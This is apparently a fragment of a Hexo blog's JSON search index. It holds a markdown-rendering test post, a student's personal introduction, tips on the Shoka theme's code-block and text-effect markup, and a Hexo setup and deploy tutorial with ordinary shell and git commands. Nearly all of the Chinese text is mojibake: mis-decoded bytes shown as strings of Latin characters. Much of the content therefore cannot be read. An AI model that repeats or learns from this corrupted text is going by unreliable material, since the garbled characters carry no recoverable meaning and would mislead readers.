è¡Œé«˜äº®1234Markdown | Less | Pretty--- | --- | ---*Still* | `renders` | **nicely**1 | 2 | 3 Markdown Less Pretty Still renders nicely 1 2 3 You can find more information about LaTeX mathematical expressions here. # Blockquotes Blockquotes are very handy in email to emulate reply text. This line is part of the same quote. Quote break. This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can put Markdown into a blockquote. # Horizontal Rule Three or more... è¡Œé«˜äº®1234567891011---Hyphens***Asterisks___Underscores Hyphens Asterisks Underscores # Line Breaks è¡Œé«˜äº®123456Here&#x27;s a line for us to start with.This line is separated from the one above by two newlines, so it will be a *separate paragraph*.This line is also a separate paragraph, but...This line is only separated by a single newline, so it&#x27;s a separate line in the *same paragraph*. Here's a line for us to start with. This line is separated from the one above by two newlines, so it will be a separate paragraph. This line is also a separate paragraph, but... This line is only separated by a single newline, so it's a separate line in the same paragraph. è¡Œé«˜äº®123456789This is a regular paragraph.&lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;This is another regular paragraph. This is a regular paragraph. &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph. # Youtube videos è¡Œé«˜äº®1234567&lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt;Pure markdown version:[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/ARted4RniaU/0.jpg)](https://www.youtube.com/watch?v=ARted4RniaU) &lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; Pure markdown version:","path":"markdown/","date":"11-04","excerpt":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.","tags":[{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"}]},{"title":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","text":"# å†™åœ¨å‰é¢ æ€»è§‰å¾—ç”Ÿæ´»é‡Œç¼ºå°‘ç‚¹ä»€ä¹ˆï¼Œå°±ä»¥æ­¤æ¥å¡«å……ä¸€ä¸‹æˆ‘çš„æ¯ç‡¥ç”Ÿæ´»å§ã€‚ å½“ç„¶å•¦ï¼Œè¡·å¿ƒåœ°ç¥ç¦æ¯ä¸€ä¸ªåˆ°è®¿æœ¬åšå®¢çš„äººï¼Œä½ ä»¬éƒ½æ˜¯æˆ‘çš„å¥½ç›†å‹ï¼å¥½åŸºå‹ï¼ hhhhhï¼æ„Ÿè°¢ä½ ä»¬ğŸ˜˜ğŸ˜˜ğŸ˜˜ å½“ç„¶è¿™ä¸ªåšå®¢ï¼Œä¹Ÿæ˜¯åœ¨å­¦ä¹ äº†å¾ˆå¤šå¤§ä½¬çš„åšå®¢ï¼Œå…¼å®¹å¹¶è“„ï¼Œå“ˆå“ˆå“ˆï¼Œæ­£å¥½è‡ªå·±ä¹Ÿæ˜¯ä¸€ä¸ªæ®µå­æ‰‹ï¼Œå–œæ¬¢å†™ä¸€ç‚¹ä¸œè¥¿ã€‚ å¦å¤–ï¼Œè¿™é‡Œå¯ä»¥æ˜¯æˆ‘å¤§å­¦ç”Ÿæ´»çš„ä¸€ä¸ªè®°å½•å§ï¼Œå¥½å•¦ï¼Œä¸å›å…±å‹‰ã€‚ æ¥ä¸‹æ¥å¯¹æœ¬åšå®¢è¿›è¡Œä¸€ä¸ªç®€å•çš„ä»‹ç»ï¼Œä½œä¸ºä¸€ä¸ªå¼€ç¯‡ï¼Œå˜¿å˜¿ã€‚ # åšå®¢åŠŸèƒ½ å­¦ä¹ è®°å½•ï¼Œç”Ÿæ´»è®°å½•ç­‰ç­‰ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œåšç¬”è®° # ç¬”è€…è‡ªä»‹ æ¥ä¸‹æ¥ç®€å•è‡ªæŠ¥å®¶é—¨å˜ï¼Œå¾ˆä¹…ä»¥å‰è§‰å¾—è‡ªå·±çš„äººç”ŸçœŸçš„æ˜¯ â€œä¸°å¯Œå¤šå½©â€ï¼Œå“ˆå“ˆï¼Œç»å†è¿‡å¾ˆå¤šå§ï¼Œç¬¨äººè®°å¿†åŠ›è¿˜å¥½ï¼ˆ++ ç°åœ¨è¿˜è®°å¾—é«˜è€ƒçš„æ¯ä¸ªç§‘ç›®çš„æ¯é“é¢˜ bushi ++{.dot .warning}ï¼‰ï¼Œç”šè‡³æƒ³å†™è‡ªä¸“ï¼Œæƒ³æ³•å¾ˆå¥½ï¼Œç°å®éª¨æ„Ÿã€‚ # æˆ‘çš„ç°åœ¨ å­¦ä¸šä¸Šç°åœ¨æ­£åœ¨å·å¤§æ”»è¯»ç½‘ç»œç©ºé—´å®‰å…¨ä¸æ³•å­¦åŒå­¦å£«å­¦ä½ï¼Œç—›å¹¶å¿«ä¹ç€ã€‚ ç”Ÿæ´»é‡Œçƒ­çˆ±äººé™…äº¤å¾€ ï¼Œå³å…´æ¼”è®²ï¼Œ å¹ç‰›ææ€ª ã€‚å¦å¤–æ˜¯æ‰“æ¸¸æˆç³•æ‰‹ï¼Œï¼Œæ¯”å¦‚å†œè¯ã€å…ƒç¥ã€CFã€æ£®æ—ã€MC.... æ‹¿ç‹è€…è£è€€æ¥è¯´å§ï¼Œå›½æœä¸è‡³äºï¼Œé‡‘æ ‡è¿˜æ˜¯æœ‰è¿‡ï¼Œå…ƒæ­Œä»£è¨€äººï¼Œæ‰€ä»¥æœ‰å¥½ç©çš„æ¸¸æˆè®°å¾—æ¨æˆ‘ã€‚è¿˜æœ‰æ˜¯ä¸ªå†›äº‹è¿·ï¼Œç ”ç©¶å›½é™…æ”¿æ²»ï¼ˆå°¬é»‘ä¸€ä¸‹ï¼Œä»…ä»…æ˜¯å¾ˆçˆ±çœ‹ï¼Œè°ˆä¸ä¸Šç ”ç©¶ï¼‰ï¼ŒåŒæ—¶å–œæ¬¢çœ‹å„ç§ç¦»å¥‡å˜æ€æ€äººæ¡ˆï¼Œå»ºå›½ä»¥æ¥çš„å›½å†…å¤–å‡ ä¹çœ‹è¿‡ä¸€éï¼Œå¯¹äºå°è¯´å–œæ¬¢çœ‹æ€ªè°ˆå’Œæ¨ç†æ–‡ï¼Œå…¶ä½™æ²¡å¤šå¤§å…´è¶£ï¼Œæœ‰æ—¶çŠ¯ç˜¾ä¼šçœ‹çœ‹çˆ½æ–‡å’Œè¨€æƒ…ã€‚ æŠ€æœ¯ä¸Šçƒ­è¡·è®¡ç®—æœºæŠ€æœ¯ï¼Œæ•°å­¦ï¼ˆæ˜¾ç„¶æ•°å­¦å¾ˆèœåˆæƒ³å­¦ï¼Œé«˜è€ƒ 107ï¼Œé“­è®° 107ï¼Œä½† 96 ä¸ªå¿—æ„¿é‡Œæœ‰ 43 ä¸ªæ•°å­¦ä¸“ä¸šï¼‰ï¼Œçƒ­è¡·ç©æœºæŠ€æœ¯ï¼Œé»‘å®¢æŠ€æœ¯ï¼ˆç€è¿·ä½†å¾ˆèœï¼‰ è¿åŠ¨ä¸Šï¼Œæ¸´æœ›æˆä¸ºçŒ›ç”·ï¼ˆï¼‰ï¼Œåœç•™åœ¨æ¸´æœ›ã€‚æ›¾ç»ç¾½æ¯›çƒæ‰“å¾—è¿˜è¡Œï¼Œèƒ½å’Œé«˜ä¸­çš„ï¼ˆæ¸£ç”·ï¼‰æ‰“å‡ ä¸ªæ¥å›ï¼Œç°åœ¨æ‰“ç½‘çƒã€æ’çƒã€ç¾½æ¯›çƒã€‚ # æˆ‘çš„æ•…äº‹ ï¼ˆå®³æ€•å¿˜è®°ï¼Œé€‰æ‹©è®°å½•ï¼‰ï¼ˆä»¥ä¸‹äººåé™¤äº†å°å­¦å¤–çš„å‡åšäº†ä¸€å®šå¤„ç†å’Œå¾å¾—æœ¬äººåŒæ„ï¼‰ **--- å°å­¦ï¼š** å°æ—¶å€™åœ¨å¹¿ä¸œå¾…äº† 10 å¹´ï¼Œç²¤è¯­ä¸€èˆ¬èˆ¬ï¼Œæˆ‘æŒ‡çš„æ˜¯æ½®æ±•è¯ï¼Œæ½®æ±•çš„æœ‹å‹å¯ä»¥æ‰¾æˆ‘æ“é¥­ï¼Œæœ€çˆ±åƒè‚ ç²‰ï¼Œæœ‰ä¸ªä»å°åˆ°å¤§çš„å°å¼Ÿåˆ˜å¼Ÿæ¯›ã€‚ å°è±¡æ·±åˆ»çš„äººï¼šæ˜¯å¾ˆé«˜çš„æ½˜ä¹¦å©·ï¼Œå­¦ä¹ è¶…ç‰›çš„é‚“ç¿ç‚«ï¼Œç»å¸¸æ‰“äººçš„éƒ‘ä¼Ÿè¶…ï¼Œæ•™å¸ˆå­å¥³çš„éƒ‘ä¼Ÿé’Šï¼Œä½åœ¨éš”å£çš„å´å®—éœ–ï¼Œï¼Œï¼Œï¼Œå°±è®°å¾—è¿™ä¹ˆå¤šï¼Œä¹Ÿæ²¡è”ç³»è¿‡äº†ï¼Œè€å¸ˆä¹Ÿæ˜¯ä¸€å¹´ä¸€æ¢ï¼Œå°è±¡ä¸æ·±åˆ»ã€‚ å¦å¤–å‘¢ï¼Œå››å¹´çº§å°±å›è€å®¶äº†ï¼Œé‡åº†å¸‚å¿ å¿ï¼ˆæ²¡é”™å°±æ˜¯é‚£ä¸ªç”µç«åŸå¸‚ï¼‰ï¼Œé¡ºæºªå°å­¦ï¼Œå®¶ä½çš‡ååŸï¼ˆçš‡ä¸Šä½è¿‡çš„å°å²›ï¼‰å¯¹é¢ï¼Œä¸´æ±Ÿï¼Œèˆ’æœï¼Œå“ˆå“ˆå“ˆï¼Œä¹Ÿç‰¹èƒ½åƒè¾£ã€‚è¿™é‡Œæˆ‘è®¤è¯†äº†ï¼Œemmï¼Œå¾ˆå¤šäººï¼Œç°åœ¨éƒ½è¿˜åœ¨è”ç³»ï¼Œå½±å“æˆ‘å¾ˆå¤§çš„é›·çˆ½ï¼ˆç©¶æææ€ªäººï¼Œä½†å’Œæˆ‘æ˜¯é“å“¥ä»¬ï¼Œç”Ÿæ­»ç‹™å‡»æ‰“ç©¿ï¼Œåæ¥åˆä¸­ä¹Ÿä¸€ä¸ªç­ï¼‰ï¼Œè¿˜æœ‰æˆç»©å¾ˆå¥½çš„å¾ˆå¤šå¾ˆå¤šäººï¼Œyhxï¼Œrjï¼Œxcyï¼Œyyrï¼Œè¿˜æœ‰ä¸ªå°èƒ– xzwã€‚ **--- åˆä¸­ï¼š** åˆä¸­æ˜¯ç¬¨äººæœ€ä¼ å¥‡çš„æ—¶å€™äº†ï¼ˆå¥½æ±‰ä¸æå½“å¹´å‹‡ï¼‰ï¼Œç¬¨äººåˆä¸­ç¬¬ä¸€æ¬¡æœˆè€ƒå¹´çº§ç¬¬ä¸€ï¼ˆå–·å­åˆ«å–·ï¼Œå­¦æ ¡ 1200 äººï¼Œéƒ½è¿‡å»äº†ï¼Œwuwuï¼‰ï¼Œè€Œåä¸€å‘ä¸å¯æ”¶æ‹¾ï¼Œç›´æ¥ä¿é‡ç‚¹é«˜ä¸­å“©ï¼ˆåªæœ‰ä¸¤æ¬¡æ²¡æ‹¿æœŸæœ«è€ƒè¯•å¹´çº§ç¬¬ä¸€ï¼‰ã€‚åœ¨å­¦æ ¡åƒå–ç©ä¹ï¼Œå½“ç­é•¿ï¼ˆä¸€ä½å¾ˆå¥½çš„ç­é•¿åˆäºŒç¦»å¼€äº†æˆ‘æ¥ç­ï¼‰ï¼Œå½“çºªå¾‹å§”å‘˜ï¼Œï¼ˆæœ¬ç­åœ¨ç¬¨äººçš„å¸¦é¢†ä¸‹å–œæé‡ç‚¹ç­å€’æ•°ç¬¬ä¸€ï¼‰ï¼Œä½†æ­¤æ—¶ä»ç„¶æ˜¯ç¤¾æã€‚ **--- åˆä¸‰æš‘å‡ï¼š** è¿™æ®µæ—¶å…‰æ˜¯æˆ‘è®°å¿†å¾ˆæ·±åˆ»çš„ï¼Œæˆ‘ç¬¬ä¸€æ¬¡è§è¯†åˆ°äººå¤–æœ‰äººï¼Œå¤©å¤–æœ‰å¤©ã€‚æˆ‘å’Œç§¦å³°ï¼ˆç°å°±è¯»äºæŸ C9ï¼‰èµ°è¿‡å‡å­¦çš„çº¢åœ°æ¯¯ï¼ŒåŒå­¦ä»¬ç¾¡æ…•çš„çœ¼å…‰é‡Œï¼Œåœ¨å­¦æ ¡çš„å¾ªç¯æ’­æŠ¥ç¥ç¦çš„å¹¿æ’­å£°é‡Œï¼ˆæˆ‘è§‰å¾—ä¸–ç•Œä¼šè¢«æˆ‘å¾æœï¼Œç¡®å®é£˜äº†ï¼‰ï¼Œåˆ°äº†å¿ å¿æœ€å¥½çš„é«˜ä¸­ã€‚æˆ‘ä»¬ä¼šæå‰ä¸Šé«˜ä¸­è¯¾ç¨‹ï¼Œå’Œå…¨å¿å‰ 50 çš„åŒå­¦ä»¬å­¦ä¹ ï¼Œå½“æ—¶æ•°å­¦æ˜¯ä¸ç­‰å¼ï¼Œç‰©ç†æ˜¯åŠ›å’Œè¿åŠ¨ï¼Œæ¯å¤©åƒäº†ç¡ï¼Œç¡äº†åƒï¼Œç”Ÿæ´»å¾ˆå¥½ï¼Œè¿™é‡Œè®¤è¯†äº†è¶…çº§å¤–å‘çš„ä»»å‰‘è¾‰ï¼Œwhï¼Œjyrï¼Œè¿˜æœ‰æˆ‘è§‰å¾—å¾ˆè™šçš„ææŸæŸï¼ˆæŠ½è±¡å“¥ç©¿ä¸è¢œï¼‰ï¼Œè¿˜æœ‰é‚“å­åŸï¼Œæ—¶é—´ä¸é•¿ï¼Œæƒ…è°Šä¸‡åƒã€‚ å¦å¤–å°±æ˜¯å…«ä¸­å¤ä»¤è¥äº†ï¼Œå•Šï¼Œå…¨å¸‚å‰å‡ ç™¾å§ï¼Œå¤ªå‰å®³äº†ï¼Œæˆ‘å€’å¸ä¸€å£å‡‰æ°”ã€‚å®³ \\\\\\ å¤ªå¤šå‰å®³çš„äººäº†ã€‚ é«˜ä¸­çš„å°è±¡è¿˜å¾ˆæ·±åˆ»ï¼Œå…ˆä¸å†™äº†ã€‚","path":"About-me/My-first-Boke/","date":"11-02","excerpt":"","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]},{"title":"åŸºäºHEXOçš„å†™åšå®¢tips","text":"# 0. è¸©å‘ 1. å›¾ç‰‡é—®é¢˜ï¼š å›¾åºŠä¸åŠ è½½ï¼šæ·»åŠ  è¡Œé«˜äº®123&#123;% raw %&#125;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#123;% endraw %&#125; 2. è‡ªåŠ¨ç¼–å·é—®é¢˜ shoka ä¸»é¢˜éšè—ç›®å½•è‡ªå¸¦æ ‡é¢˜ï¼Œå¹¶è®¾ç½®æ˜¾ç¤ºå°æ ‡é¢˜_shoka ä¸»é¢˜æ ‡ç­¾_å®ç†å¤§ç¥ 1996 çš„åšå®¢ - CSDN åšå®¢ # 1.links æ€ä¹ˆæ”¾å¥½å‹é“¾æ¥ï¼Œçœ‹è¿™é‡Œ å„ªèŒåˆè¯ ç‰ç’ƒçš„åŒ»å­¦ & ç¼–ç¨‹ç¬”è®° å„ªèŒåˆè¯ https://shoka.lostyu.me å„ªèŒåˆè¯ ç‰ç’ƒçš„åŒ»å­¦ & ç¼–ç¨‹ç¬”è®° # 2.code ä»£ç å— ä½¿ç”¨ markdown-it-prism è¿›è¡Œä»£ç é«˜äº®ï¼Œæ”¯æŒæ˜¾ç¤ºè¡Œå·ã€è¡Œé«˜äº® mark ã€å‘½ä»¤è¡Œæç¤ºç¬¦ command ã€ä»£ç å—æ ‡é¢˜ã€‚ åŸºæœ¬æ ¼å¼ï¼š[language][title][url][linktext][mark][command]åŸºæœ¬æ ¼å¼ï¼š [language] [title] [url] [link text] [mark] [command] åŸºæœ¬æ ¼å¼ï¼š[language][title][url][linktext][mark][command] ä¸¾ä¸ªæ —å­ï¼š è¡Œé«˜äº® mark:1,6-7123456import java.util.Scanner;...Scanner in = new Scanner (System.in);// è¾“å…¥ Scan ä¹‹åï¼ŒæŒ‰ä¸‹é”®ç›˜ Alt + â€œ/â€ é”®ï¼ŒEclipse ä¸‹è‡ªåŠ¨è¡¥å…¨ã€‚System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;); å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1234567891011pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123456789101112131415161718192021```java è¡Œé«˜äº® www.baidu.com å‚è€ƒé“¾æ¥ mark:1,6-7import java.util.Scanner;...Scanner in = new Scanner (System.in);// è¾“å…¥ Scan ä¹‹åï¼ŒæŒ‰ä¸‹é”®ç›˜ Alt + â€œ/â€ é”®ï¼ŒEclipse ä¸‹è‡ªåŠ¨è¡¥å…¨ã€‚System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;);``````bash å‘½ä»¤è¡Œæç¤ºç¬¦ command:(&quot;[root@localhost] $&quot;:1,9-10||&quot;[admin@remotehost] #&quot;:4-6)pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push``` å¸¸ç”¨åˆ°çš„æŒ‡ä»¤ï¼š java è¡Œé«˜äº® mark:1, æŸæŸ bash å‘½ä»¤æç¤ºç¬¦ command:(&quot;[root@ä½ çš„åå­—] $&quot;:1,9-10||&quot;[admin@ä½ çš„åå­—] #&quot;:4-6) # 3. è¡¨æƒ…åŒ… emoji ç»˜æ–‡å­— æœ¬åŠŸèƒ½åŸºäº markdown-it-emoji ï¼Œæ‰€æœ‰æ ‡ç­¾å‚è€ƒæˆ³æ­¤ï¼šmarkdown-it-emoji/lib/data/full.json at master Â· markdown-it/markdown-it-emoji (github.com) å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123:kissing_heart::ring::notes: å¦‚ï¼šğŸ˜˜ ğŸ’ ä¸¤ä¸ªå†’å· # 4. æ–‡å­—ç‰¹æ•ˆ æœ¬åŠŸèƒ½åŸºäº markdown-it-ins ã€ markdown-it-bracketed-spans å’Œ markdown-it-attrs æœ¬ä¸»é¢˜é£æ ¼é¢œè‰²é€šç”¨æ ·å¼ï¼šdefaultã€primaryã€successã€infoã€warningã€danger å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)12345678910111213141516171819202122++ ä¸‹åˆ’çº¿ ++++ æ³¢æµªçº¿ ++&#123;.wavy&#125;++ ç€é‡ç‚¹ ++&#123;.dot&#125;++ ç´«è‰²ä¸‹åˆ’çº¿ ++&#123;.primary&#125;++ ç»¿è‰²æ³¢æµªçº¿ ++&#123;.wavy .success&#125;++ é»„è‰²ç€é‡ç‚¹ ++&#123;.dot .warning&#125;~~ åˆ é™¤çº¿ï½ï½~~ çº¢è‰²åˆ é™¤çº¿ï½ï½&#123;.danger&#125;== è§å…‰é«˜äº® ==[èµ¤æ©™é»„ç»¿é’è“ç´«]&#123;.rainbow&#125;[çº¢è‰²]&#123;.red&#125;[ç²‰è‰²]&#123;.pink&#125;[æ©™è‰²]&#123;.orange&#125;[é»„è‰²]&#123;.yellow&#125;[ç»¿è‰²]&#123;.green&#125;[é›é’]&#123;.aqua&#125;[è“è‰²]&#123;.blue&#125;[ç´«è‰²]&#123;.purple&#125;[ç°è‰²]&#123;.grey&#125;å¿«æ·é”® [Ctrl]&#123;.kbd&#125; + [C]&#123;.kbd .red&#125;H~2~029^th^ è¿™æ®µä»£ç å› ä¸ºè‡ªåŠ¨è¢« pangu.js å¤„ç†äº†ä¸€ä¸‹ï¼ŒåŠ äº†å‡ ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´ç›´æ¥å¤åˆ¶ä»£ç ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚ æ­£ç¡®çš„ä»£ç æ˜¯ ä¸‹åˆ’çº¿ åˆ é™¤çº¿ è§å…‰é«˜äº® ï¼Œä¸èƒ½æœ‰ç©ºæ ¼å“¦ã€‚ # 5. éšè—æ–‡å­— è¡Œé«˜äº®12!! é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•ï¼ï¼ï¼š é¼ æ ‡æ»‘è¿‡æ˜¾ç¤ºå†…å®¹!! æ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šï¼ï¼&#123;.bulr&#125; ï¼š é€‰ä¸­æ–‡å­—æ˜¾ç¤ºå†…å®¹ !! é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•é»‘å¹•ï¼ï¼ï¼š é¼ æ ‡æ»‘è¿‡æ˜¾ç¤ºå†…å®¹ !! æ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šæ¨¡ç³Šï¼ï¼{.bulr} ï¼š é€‰ä¸­æ–‡å­—æ˜¾ç¤ºå†…å®¹","path":"å†™åšå®¢æ•™ç¨‹/","date":"11-02","excerpt":"","tags":[{"name":"åšå®¢è¯´æ˜","slug":"åšå®¢è¯´æ˜","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"åŸºäºhexoå’Œshokaçš„åšå®¢ä½¿ç”¨æ•™ç¨‹","text":"# 1.hexo å®˜æ–¹æ•™ç¨‹ Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. # Create a new post å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;My New Post&quot; More info: Writing # Run server å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo server More info: Server # Generate static files å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo generate More info: Generating # Deploy to remote sites å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo deploy More info: Deployment # 2. å‚è€ƒåšå®¢ ä¸ªäººåšå®¢æ­å»ºå®Œæ•´ç‰ˆç¬”è®° | pitt1997 = = çœŸæ­£çš„å¤§å¸ˆæ°¸è¿œéƒ½æ€€ç€ä¸€é¢—å­¦å¾’çš„å¿ƒ æ—©æ•™çº§åˆ«æ•™ä½ ä½¿ç”¨ Hexo å’Œ GitHub Pages æ­å»ºå±äºè‡ªå·±çš„é™æ€åšå®¢ - æ­å»ºåšå®¢ - å‰ç«¯è®¾è®¡ | MyBlog = MqyGalaxy | Blog = çˆ±å¥½ ACG çš„æ¸©é¦¨å°çª (moeqy.com) Step.3 ç•Œé¢æ˜¾ç¤º - Theme Shoka Documentation - äºŒè¿›åˆ¶æ‚è°ˆ - è®¡ç®—æœºç§‘å­¦ | Yume Shoka = å„ªèŒåˆè¯ = æœ‰å¤¢æ›¸æ¶ (lostyu.me) # 3.Shoka çš„ä¸€äº›é…ç½®å’Œè¯´æ˜ æˆ‘ä»¬å·²ç»å®Œæˆ Hexo é»˜è®¤å®‰è£…ä»¥åŠéƒ¨ç½²ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨å…¶ä»–ä¸»é¢˜åŠ è½½æˆ‘ä»¬çš„ä¸ªäººåšå®¢ã€‚ Shoka ä¸»é¢˜ç›¸å…³é“¾æ¥å¦‚ä¸‹ã€‚ 123456ä¸»é¢˜ä¸»é¡µï¼šhttps://shoka.lostyu.me/æ–‡æ¡£è¯´æ˜ï¼šhttps://shoka.lostyu.me/computer-science/note/theme-shoka-doc/åŸºæœ¬é…ç½®: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/config/é¡µé¢é…ç½®: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/ä¾èµ–æ’ä»¶: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/dependents/ # 4. å‘å¸ƒåšå®¢ å†™ä¸€ç¯‡æ–‡ç« ï¼Œæ­¥éª¤å‚è€ƒ # åˆ›å»ºæ–‡ç«  å…¶ä¸­ title ä¸ºæ–‡ç« çš„æ ‡é¢˜ã€‚ å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;title&quot; æ‰§è¡Œå®Œæˆå hexo ä¼šæ ¹æ®ç›®å½•ä¸‹ scaffolds/post.mdï¼Œåœ¨ source/_posts æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º title.md çš„æ–‡ä»¶ã€‚ 123 --- title: hello-worlddate: 2023-11-23 01:03:24tags: --- balabala..... æ¥ä¸‹æ¥å°±å¯ä»¥æ­£å¼å¼€å§‹å†™æ–‡ç« äº†ã€‚ # éƒ¨ç½²æ–‡ç«  å‘½ä»¤è¡Œæç¤ºç¬¦ command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123hexo g -chexo shexo d æ‰§è¡Œå®Œæˆä¹‹åå†æ¬¡è®¿é—®å°±å¯ä»¥çœ‹åˆ°å†…å®¹äº†ï½","path":"åŸºäºhexoå’Œshokaçš„åšå®¢ä½¿ç”¨æ•™ç¨‹/","date":"11-02","excerpt":"","tags":[{"name":"åšå®¢è¯´æ˜","slug":"åšå®¢è¯´æ˜","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}],"categories":[],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"åšå®¢è¯´æ˜","slug":"åšå®¢è¯´æ˜","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"},{"name":"å¤§åˆ›","slug":"å¤§åˆ›","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"},{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"},{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]}